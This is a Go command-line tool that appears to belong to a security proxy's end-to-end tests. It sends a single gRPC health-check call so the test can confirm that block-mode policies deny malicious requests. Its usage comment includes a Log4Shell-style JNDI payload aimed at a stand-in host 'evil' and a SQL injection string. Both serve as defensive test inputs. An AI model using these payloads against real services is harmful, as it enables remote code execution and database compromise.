// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

// Command grpchealth makes one gRPC call, grpc.health.v1.Health/Check,
// over HTTP/2 without TLS, and prints the call's status code (OK,
// PermissionDenied, ...). The kind end-to-end test uses it to check that
// gRPC calls pass a policy in block mode, and that one with an attack in
// its metadata is denied (#284), or in its message when the policy
// inspects messages (#275). -method calls another method of the service
// with the same request, one a schema doesn't describe; -descriptor-set
// writes grpc/health/v1/health.proto's descriptor set to stdout instead,
// for a policy's gRPC schema (#316).
//
//	go run ./hack/grpchealth -authority grpc.example.com -metadata 'x-api-key=${jndi:ldap://evil/a}' 127.0.0.1:18091
//	go run ./hack/grpchealth -authority grpc.example.com -service "1' OR '1'='1' -- " 127.0.0.1:18091
//	go run ./hack/grpchealth -descriptor-set > health.binpb
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/health/grpc_health_v1"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protodesc"
	"google.golang.org/protobuf/types/descriptorpb"
)

func main() {
	authority := flag.String("authority", "", "the :authority to send")
	service := flag.String("service", "", "the HealthCheckRequest's service: text in the message")
	method := flag.String("method", "/grpc.health.v1.Health/Check", "the method to call with the HealthCheckRequest")
	descriptorSet := flag.Bool("descriptor-set", false, "write health.proto's FileDescriptorSet to stdout, and call nothing")
	var md []string
	flag.Func("metadata", "a `key=value` pair to send as metadata (repeatable)", func(s string) error {
		k, v, ok := strings.Cut(s, "=")
		if !ok {
			return fmt.Errorf("%q is not key=value", s)
		}
		md = append(md, k, v)
		return nil
	})
	flag.Usage = func() {
		fmt.Fprintln(os.Stderr, "usage: grpchealth [-authority HOST] [-service NAME] [-metadata KEY=VALUE]... HOST:PORT")
		flag.PrintDefaults()
	}
	flag.Parse()
	if *descriptorSet {
		set := &descriptorpb.FileDescriptorSet{File: []*descriptorpb.FileDescriptorProto{
			protodesc.ToFileDescriptorProto(grpc_health_v1.File_grpc_health_v1_health_proto),
		}}
		b, err := proto.Marshal(set)
		if err == nil {
			_, err = os.Stdout.Write(b)
		}
		if err != nil {
			fmt.Fprintln(os.Stderr, "grpchealth:", err)
			os.Exit(1)
		}
		return
	}
	if flag.NArg() != 1 {
		flag.Usage()
		os.Exit(2)
	}
	code, err := check(flag.Arg(0), *authority, *method, *service, md)
	if err != nil {
		fmt.Fprintln(os.Stderr, "grpchealth:", err)
		os.Exit(1)
	}
	fmt.Println(code)
}

func check(target, authority, method, service string, md []string) (string, error) {
	opts := []grpc.DialOption{grpc.WithTransportCredentials(insecure.NewCredentials())}
	if authority != "" {
		opts = append(opts, grpc.WithAuthority(authority))
	}
	conn, err := grpc.NewClient("passthrough:///"+target, opts...)
	if err != nil {
		return "", err
	}
	defer func() { _ = conn.Close() }()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	ctx = metadata.AppendToOutgoingContext(ctx, md...)
	err = conn.Invoke(ctx, method, &grpc_health_v1.HealthCheckRequest{Service: service}, &grpc_health_v1.HealthCheckResponse{})
	st, ok := status.FromError(err)
	if !ok {
		return "", err
	}
	// A status the proxy made up says why.
	if st.Code() != 0 && st.Message() != "" {
		fmt.Fprintln(os.Stderr, "grpchealth:", st.Message())
	}
	return st.Code().String(), nil
}
